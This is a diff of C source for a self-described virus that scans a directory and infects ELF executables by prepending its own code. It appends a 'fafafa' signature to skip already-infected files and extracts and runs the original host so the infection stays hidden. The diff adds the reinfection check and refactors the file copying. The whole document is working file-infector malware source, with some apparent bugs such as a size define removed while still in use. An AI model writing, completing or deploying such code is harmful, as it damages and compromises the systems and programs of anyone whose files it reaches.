@@ -4,8 +4,6 @@
 #include <sys/sendfile.h>
 #include <sys/wait.h>
 #include <errno.h>
-#define SIZE  18056
-
 extern unsigned char src_buzz_buzzard_bin[];
 extern unsigned int src_buzz_buzzard_bin_len;
 
@@ -55,24 +53,25 @@ void get_files_list(char *directory_path, char *file_array[MAX_FILES], int *file
 	closedir(dir);
 }
 /*This function creates temporary file that will later be filled with a copy of the code that was added to the main file, and then execute this*/
-void execute(int vfd, mode_t mode, int totalSize, char *argv[],  char *const envp[])
+void execute(int vfd, mode_t mode, int totalSize, char *argv[], char *const envp[])
 {
 	/*Create a temporary file*/
 	int tfd = creat("../tempfile", mode);
-
 	lseek(vfd, SIZE, SEEK_SET);
-	int signatureSize = sizeof("fafafa");
+	int signatureSize = sizeof(signature);
 	/*Get the host size that will be the total size less VIRUS SIZE + signatura size*/
 	int hostSize = totalSize - SIZE - signatureSize;
-	printf("%d %d %d %d %d\n ",totalSize, SIZE, signatureSize, vfd, hostSize);
+	printf("%d %d %d %d %d\n ", totalSize, SIZE, signatureSize, vfd, hostSize);
 	/*Send the host size to this temporary file*/
-	sendfile(tfd, vfd, NULL, hostSize);
+	ft_sendfile(tfd, vfd, NULL, hostSize);
 	close(tfd);
 	/*Use chmod  so  the file is executed*/
 	char mode2[] = "0755";
-    int i = strtol(mode2, 0, 8);
-    if (chmod("../tempfile", i) < 0){
-        printf("error in chmod() - \n" );}
+	int i = strtol(mode2, 0, 8);
+	if (chmod("../tempfile", i) < 0)
+	{
+		printf("error in chmod() - \n");
+	}
 	pid_t pid = fork();
 	if (pid == 0)
 	{
@@ -85,17 +84,32 @@ void execute(int vfd, mode_t mode, int totalSize, char *argv[],  char *const env
 /*This function create a file that will contain the copy of the virus and the host file*/
 void inject(char *host_file, int vfd)
 {
+	size_t sig_len = strlen(signature);
+	char sig_check[sig_len + 1];
+	lseek(vfd, sizeof(signature) * -1, SEEK_END);
+	read(vfd, &sig_check, sizeof(signature));
+	printf("%s, %s \n ", sig_check, signature);
+	sig_check[sig_len] = '\0';
+	if (strcmp(sig_check, signature) == 0)
+	{
+		printf("Signature matches. Exiting with status 1.\n");
+		return;
+	}
+	else
+	{
+		printf("Signature does not match.\n");
+	}
+	lseek(vfd, 0, SEEK_SET);
 	/*Open the host file*/
 	int hfd = open(host_file, O_RDONLY);
 	struct stat st;
 	fstat(hfd, &st);
 	int host_size = st.st_size;
-	char *signature = "fafafa";
 	/*Crate the new file that will have temporary name*/
 	int tfd = creat("/home/atila/temp/tempfile", st.st_mode);
 	/*Inject both codes and signature on it*/
-	sendfile(tfd, vfd, NULL, SIZE);
-	sendfile(tfd, hfd, NULL, host_size);
+	ft_sendfile(tfd, vfd, NULL, SIZE);
+	ft_sendfile(tfd, hfd, NULL, host_size);
 	write(tfd, &signature, sizeof(signature));
 	/*Rename it to the host file name*/
 	rename("/home/atila/temp/tempfile", host_file);
@@ -113,7 +127,6 @@ int main(int argc, char *argv[], char *const envp[])
 	/*check all files and if it is valid elf file it will infect it*/
 	for (int i = 0; i < files_count; i++)
 	{
-
 		printf("%s ", file_array[i]);
 		if (elf_init(file_array[i], &elf) == 1)
 		{
@@ -125,7 +138,6 @@ int main(int argc, char *argv[], char *const envp[])
 			execute(vfd, st.st_mode, st.st_size, argv, envp);
 			close(vfd);
 		}
-
 		else
 			printf("not infect");
 		free(file_array[i]);
